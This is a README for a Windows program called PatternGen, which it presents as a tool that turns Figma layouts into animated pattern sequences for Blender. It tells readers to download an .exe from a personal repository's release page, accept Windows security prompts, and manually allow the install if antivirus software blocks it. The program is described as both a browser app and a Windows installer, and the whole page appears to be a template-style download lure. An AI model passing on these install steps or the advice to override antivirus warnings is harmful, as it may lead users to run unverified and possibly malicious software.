# 🎨 patterngen-oss - Create animated patterns for motion graphics

[![Download PatternGen for Windows](https://img.shields.io/badge/Download-PatternGen-blue)](https://github.com/ugyens7615/patterngen-oss/releases)

## 🎯 Purpose of this tool

PatternGen helps you build animated motion graphics. It connects your design work in Figma with the power of Blender. This tool takes your artboards and creates moving patterns that you can place behind your text or shapes. You gain a professional look without needing to build every line by hand.

## ⚙️ Minimum system requirements

Before you run the software, ensure your computer meets these needs:

*   Operating System: Windows 10 or Windows 11.
*   Memory: 8 GB of RAM or more.
*   Graphics Card: A card that supports modern web graphics.
*   Storage: 200 MB of free space for the application.
*   Browser: Google Chrome or Microsoft Edge for the web interface.

## 📥 Downloading the software

You need to download the installer from the release page.

1.  Open the [official release page](https://github.com/ugyens7615/patterngen-oss/releases).
2.  Look for the latest version at the top of the list.
3.  Click the file ending in .exe to start the download.
4.  Save the file to your Downloads folder.

## 🚀 Setting up the application

Follow these steps to prepare your system:

1.  Locate the downloaded file in your folder.
2.  Double-click the file to start the setup process.
3.  Confirm the security prompt if Windows asks.
4.  Follow the simple instructions on your screen.
5.  Wait for the progress bar to finish.
6.  Launch the application from your Start menu.

## 🛠️ How to use the workflow

This tool follows a three-part process. You use Figma to prepare your layout, the web app to build the patterns, and Blender to finish the project.

### Step 1: Design in Figma
Design your title composition inside Figma. Use the plugin to export your artboards. The plugin creates a JSON file. This file contains the data about where your text sits and what colors you chose. Save this file to a folder you can find easily.

### Step 2: Generate patterns
Open the PatternGen application. Import the JSON file you exported from Figma. The browser interface will show your layout. Choose the pattern type you want to see behind your design. Adjust the settings to match your vision. When you feel happy with the result, hit the export button. This action creates a folder of image files. These images show the animation frame by frame.

### Step 3: Composite in Blender
Open Blender on your machine. Create a new scene. Import the image sequence you exported from PatternGen. Use these images as planes in your 3D view. Apply a material that glows to make the patterns shine. Render your final video from Blender.

## 💡 Tips for better patterns

*   Keep your Figma layers organized. Groups and frames help the exporter understand your project structure.
*   Use bright colors for your patterns to make them stand out.
*   Test different speed settings in the web app to see how they change the motion.
*   Preview your sequence in the application before you export to save time.

## 📁 File structure explanation

When you export your work, you will see a specific folder structure. 

*   The JSON file acts as the bridge between your design and the animation engine.
*   The PNG sequence represents every frame of your motion. Each file stays static, but Blender plays them back in order to create movement.
*   Keep these files in one folder. If you move them, the links inside your projects might break.

## ❓ Troubleshooting common issues

If the app fails to start, check if your antivirus software blocked the install. Some security programs flag new tools. You may need to grant permission manually. 

If the export fails, check your disk space. Generating image sequences requires enough room to store hundreds of individual files. Clear some space and try again.

If the import into Blender looks wrong, ensure you enabled the Image as Planes add-on. This standard Blender add-on maps your PNG sequences to flat shapes automatically. Check your materials to ensure you set the blend mode to Alpha Blend or Opaque.

## 📣 Staying updated

Software changes over time. Check the release page once a month to see if a newer version exists. New versions often include more pattern types and better export options for Blender. Always remove older versions before you install a fresh update. This keeps your system clean. 

## 🌐 Community resources

You can watch the video guide to see these steps in action. The walkthrough explains how to build a title card from start to finish. Watching the process helps you understand how the software logic works. Practice with simple shapes first. Once the workflow feels natural, create more complex compositions.